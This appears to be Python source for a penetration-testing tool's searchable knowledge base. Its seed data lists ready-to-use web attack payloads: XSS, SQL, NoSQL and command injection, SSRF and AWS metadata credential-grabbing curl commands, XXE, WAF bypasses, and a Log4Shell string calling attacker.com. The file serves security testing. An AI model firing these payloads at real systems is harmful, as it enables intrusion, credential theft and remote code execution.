import asyncio
import json
import os
import time
from pathlib import Path
from typing import Optional

import aiosqlite


KB_DIR = Path.home() / ".truthzero" / "knowledge"
KB_DB = KB_DIR / "security_kb.db"


class KnowledgeBase:
    def __init__(self, db_path: str = ""):
        self.db_path = db_path or str(KB_DB)
        self._db = None

    async def init(self):
        os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
        self._db = await aiosqlite.connect(self.db_path)
        self._db.row_factory = aiosqlite.Row
        await self._db.executescript("""
            CREATE VIRTUAL TABLE IF NOT EXISTS kb_entries USING fts5(
                category, title, content, source, tags
            );
            CREATE TABLE IF NOT EXISTS kb_meta (
                key TEXT PRIMARY KEY,
                value TEXT,
                updated_at REAL
            );
        """)
        await self._db.commit()

        async with self._db.execute("SELECT COUNT(*) as cnt FROM kb_entries") as cur:
            row = await cur.fetchone()
            if row["cnt"] == 0:
                await self._seed_default()

    async def _seed_default(self):
        entries = [
            ("payload", "XSS Basic Payloads", "<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>\n\"><img src=x onerror=alert(1)>\n'-alert(1)-'\n<details open ontoggle=alert(1)>", "builtin", "xss,injection,client-side"),
            ("payload", "SQLi Detection", "' OR '1'='1\n\" OR \"1\"=\"1\n' OR 1=1--\n' UNION SELECT NULL--\n' AND 1=2--\n1' ORDER BY 1--\n' OR SLEEP(5)--\n'; WAITFOR DELAY '0:0:5'--", "builtin", "sqli,injection,database"),
            ("payload", "SSRF Payloads", "http://127.0.0.1\nhttp://169.254.169.254/latest/meta-data/\nhttp://[::1]\nhttp://0.0.0.0\nhttp://metadata.google.internal/\nhttp://169.254.169.254/metadata/instance\ngopher://127.0.0.1:6379/_\ndict://127.0.0.1:6379/", "builtin", "ssrf,bypass,cloud"),
            ("payload", "SSTI Payloads", "{{7*7}}\n{{config}}\n${7*7}\n<%= 7*7 %>\n{{''.__class__.__mro__[1].__subclasses__()}}\n#{7*7}\n*{7*7}\n{{request.application.__globals__}}", "builtin", "ssti,template,injection"),
            ("payload", "Command Injection", "; id\n| id\n`id`\n$(id)\n; cat /etc/passwd\n| cat /etc/passwd\n&& whoami\n|| whoami\n%0aid", "builtin", "cmdi,injection,rce"),
            ("payload", "Path Traversal", "../../../etc/passwd\n..\\..\\..\\windows\\win.ini\n....//....//etc/passwd\n%2e%2e%2f%2e%2e%2fetc/passwd\n..%252f..%252fetc/passwd\n/etc/passwd%00.jpg", "builtin", "lfi,traversal,file"),
            ("payload", "XXE Payloads", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>\n<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP-COLLAB">]><foo>&xxe;</foo>', "builtin", "xxe,xml,injection"),
            ("payload", "NoSQL Injection", '{"$gt": ""}\n{"$ne": ""}\n{"$regex": ".*"}\n{"$where": "1==1"}\ntrue, $where: \'1 == 1\'', "builtin", "nosql,mongodb,injection"),
            ("technique", "AWS Metadata SSRF", "IMDSv1: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\nIMDSv2: TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600') && curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/", "builtin", "ssrf,aws,cloud,metadata"),
            ("technique", "JWT Attacks", "Algorithm confusion: Change RS256 to HS256, sign with public key\nAlg none: {\"alg\":\"none\"}\nKid injection: {\"kid\":\"/dev/null\"}\nJWK injection: embed attacker's key in header\njwt_tool: python3 jwt_tool.py <token> -X a", "builtin", "jwt,auth,bypass"),
            ("technique", "OAuth Attacks", "redirect_uri manipulation: change to attacker domain\nState CSRF: remove or reuse state parameter\nToken leakage: check referrer header after redirect\nOpen redirect chain: use open redirect as redirect_uri\nScope upgrade: request additional scopes after initial auth", "builtin", "oauth,auth,bypass"),
            ("technique", "Race Condition", "HTTP/2 single-packet attack: send N requests in one TCP packet\nUse Turbo Intruder or custom script\nTargets: coupon redemption, money transfer, vote manipulation, MFA bypass\nKey: all requests must arrive at server simultaneously", "builtin", "race,toctou,concurrency"),
            ("technique", "Cache Poisoning", "Unkeyed headers: X-Forwarded-Host, X-Original-URL, X-Rewrite-URL\nFat GET: add body to GET request\nHTTP request smuggling -> cache poison\nWeb Cache Deception: /account.css, /profile.js paths", "builtin", "cache,poisoning,cdn"),
            ("technique", "Prototype Pollution", "Server-side: __proto__.isAdmin = true in JSON merge\nClient-side: constructor.prototype via URL params\nGadgets: child_process.execSync, vm.runInNewContext\nDetection: {\"__proto__\":{\"test\":1}} then check if obj.test === 1", "builtin", "prototype,pollution,javascript"),
            ("technique", "Deserialization", "Java: ysoserial CommonsBeanutils1, CommonsCollections\nPHP: phpggc, unserialize() sink\nPython: pickle.loads(), yaml.load()\n.NET: BinaryFormatter, ObjectStateFormatter\nRuby: Marshal.load, YAML.load", "builtin", "deserialization,rce,injection"),
            ("bypass", "WAF Bypass XSS", "<svg/onload=alert(1)>\n<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>\n<input onfocus=alert(1) autofocus>\n%253Cscript%253Ealert(1)%253C/script%253E\n<img src=x onerror=\\u0061lert(1)>", "builtin", "waf,bypass,xss"),
            ("bypass", "WAF Bypass SQLi", "/*!50000UNION*/+/*!50000SELECT*/\n0x756e696f6e+0x73656c656374\nuNiOn%20SeLeCt\nUNION%0aSELECT\n1'--/**/-\n' /*!or*/ 1=1-- -", "builtin", "waf,bypass,sqli"),
            ("bypass", "SSRF IP Bypass", "http://2130706433 (decimal 127.0.0.1)\nhttp://0x7f000001 (hex)\nhttp://017700000001 (octal)\nhttp://127.1\nhttp://[::ffff:127.0.0.1]\nhttp://127.0.0.1.nip.io\nhttp://attacker.com@127.0.0.1", "builtin", "ssrf,bypass,ip"),
            ("cve", "Log4Shell CVE-2021-44228", "Apache Log4j2 RCE via JNDI injection\nPayload: ${jndi:ldap://attacker.com/a}\nAffected: Log4j 2.0-beta9 to 2.14.1\nDetection: ${jndi:ldap://COLLAB}\nBypass: ${${lower:j}ndi:${lower:l}dap://COLLAB}", "builtin", "log4j,rce,java,critical"),
            ("cve", "Spring4Shell CVE-2022-22965", "Spring Framework RCE via data binding\nAffected: Spring Framework 5.3.0-5.3.17, JDK 9+\nPayload: class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25{c2}i\nRequires: Tomcat deployment as WAR", "builtin", "spring,rce,java,critical"),
        ]
        for cat, title, content, source, tags in entries:
            await self._db.execute(
                "INSERT INTO kb_entries (category, title, content, source, tags) VALUES (?, ?, ?, ?, ?)",
                (cat, title, content, source, tags),
            )
        await self._db.commit()

    async def search(self, query: str, category: str = "", limit: int = 10) -> list[dict]:
        clean = query.replace('"', '').replace("'", "").strip()
        if not clean:
            return []
        terms = " OR ".join(f'"{w}"' for w in clean.split() if len(w) > 1)
        if not terms:
            terms = f'"{clean}"'

        sql = "SELECT category, title, content, source, tags, rank FROM kb_entries WHERE kb_entries MATCH ?"
        params = [terms]
        if category:
            sql += " AND category = ?"
            params.append(category)
        sql += " ORDER BY rank LIMIT ?"
        params.append(limit)

        try:
            async with self._db.execute(sql, params) as cur:
                rows = await cur.fetchall()
            return [dict(row) for row in rows]
        except Exception:
            sql2 = "SELECT category, title, content, source, tags FROM kb_entries WHERE content LIKE ? OR title LIKE ? OR tags LIKE ?"
            like = f"%{clean}%"
            if category:
                sql2 += " AND category = ?"
                async with self._db.execute(sql2 + " LIMIT ?", [like, like, like, category, limit]) as cur:
                    rows = await cur.fetchall()
            else:
                async with self._db.execute(sql2 + " LIMIT ?", [like, like, like, limit]) as cur:
                    rows = await cur.fetchall()
            return [dict(row) for row in rows]

    async def add_entry(self, category: str, title: str, content: str, source: str = "user", tags: str = ""):
        await self._db.execute(
            "INSERT INTO kb_entries (category, title, content, source, tags) VALUES (?, ?, ?, ?, ?)",
            (category, title, content, source, tags),
        )
        await self._db.commit()

    async def import_file(self, filepath: str, category: str = "imported") -> int:
        path = Path(filepath)
        if not path.exists():
            return 0
        content = path.read_text(errors="ignore")
        entries = content.split("\n---\n") if "\n---\n" in content else [content]
        count = 0
        for entry in entries:
            lines = entry.strip().splitlines()
            if not lines:
                continue
            title = lines[0].lstrip("# ").strip()
            body = "\n".join(lines[1:]).strip()
            if body:
                await self.add_entry(category, title, body[:5000], f"file:{path.name}")
                count += 1
        return count

    async def get_stats(self) -> dict:
        async with self._db.execute("SELECT COUNT(*) as cnt FROM kb_entries") as cur:
            row = await cur.fetchone()
            total = row["cnt"]
        categories = {}
        async with self._db.execute("SELECT category, COUNT(*) as cnt FROM kb_entries GROUP BY category") as cur:
            rows = await cur.fetchall()
        for row in rows:
            categories[row["category"]] = row["cnt"]
        return {"total": total, "categories": categories}

    async def close(self):
        if self._db:
            await self._db.close()

    def format_results(self, results: list[dict]) -> str:
        if not results:
            return "No results found."
        lines = []
        for r in results:
            lines.append(f"  [{r.get('category', '?')}] {r.get('title', '?')}")
            content = r.get("content", "")[:300]
            for line in content.split("\n"):
                lines.append(f"    {line}")
            lines.append("")
        return "\n".join(lines)
